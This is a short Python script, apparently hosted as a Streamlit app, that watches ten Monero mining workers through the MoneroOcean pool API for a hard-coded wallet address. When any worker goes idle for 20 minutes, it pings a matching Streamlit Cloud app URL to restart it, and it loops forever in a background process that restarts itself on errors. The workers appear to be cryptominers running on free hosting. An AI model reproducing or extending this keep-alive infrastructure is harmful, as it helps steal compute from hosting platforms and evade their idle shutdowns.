import requests
import streamlit as st 
import json
import time
from multiprocessing import Process

pool = "https://api.moneroocean.stream/miner/"
addr ="49FrBm432j9fg33N8PrwSiSig7aTrxZ1wY4eELssmkmeESaYzk2fPkvfN7Kj4NHMfH11NuhUAcKc5DkP7jZQTvVGUnD243g"
stats ="/stats/"


def resp(worker):
  
  host = pool + addr + stats + worker
  res = requests.get(host)
  time.sleep(10)
  jde = json.loads(str(res.text))
  workt = jde[("lts")]
  t = time.time()
  lst = t - workt
  lstnt = lst / 60
  if lstnt >= 20:
    #mv4
    if worker == "mv6gen1":
      requests.get("https://vyom00907-mv6-mv6gen1-bkxwda.streamlit.app/")
    if worker == "mv6gen2":
      requests.get("https://vyom00907-mv6-mv6gen2-452zth.streamlit.app/")
    if worker == "mv6gen3":
      requests.get("https://vyom00907-mv6-mv6gen3-kxspfn.streamlit.app/")
    if worker == "mv6gen4":
      requests.get("https://vyom00907-mv6-mv6gen4-w12dib.streamlit.app/")
    if worker == "mv6gen5":
      requests.get("https://vyom00907-mv6-mv6gen5-bmioe7.streamlit.app/")
    if worker == "mv6gen6":
      requests.get("https://vyom00907-mv6-mv6gen6-7kqunf.streamlit.app/")
    if worker == "mv6gen7":
      requests.get("https://vyom00907-mv6-mv6gen7-r9jkx5.streamlit.app/")
    if worker == "mv6gen8":
      requests.get("https://vyom00907-mv6-mv6gen8-sp7j2q.streamlit.app/")
    if worker == "mv6gen9":
      requests.get("https://vyom00907-mv6-mv6gen9-oee9ic.streamlit.app/")
    if worker == "mv6gen10":
      requests.get("https://vyom00907-mv6-mv6gen10-82mwbs.streamlit.app/")
    
      

def stch():
    while 1==1 :
      
      #mv4
      resp("mv6gen1")
      resp("mv6gen2")
      resp("mv6gen3")
      resp("mv6gen4")
      resp("mv6gen5")
      resp("mv6gen6")
      resp("mv6gen7")
      resp("mv6gen8")
      resp("mv6gen9")
      resp("mv6gen10")

def ch():
  try:
    stch()
  except:
    ch()

  
proc = Process(target=ch ,args=())
proc.start()

  
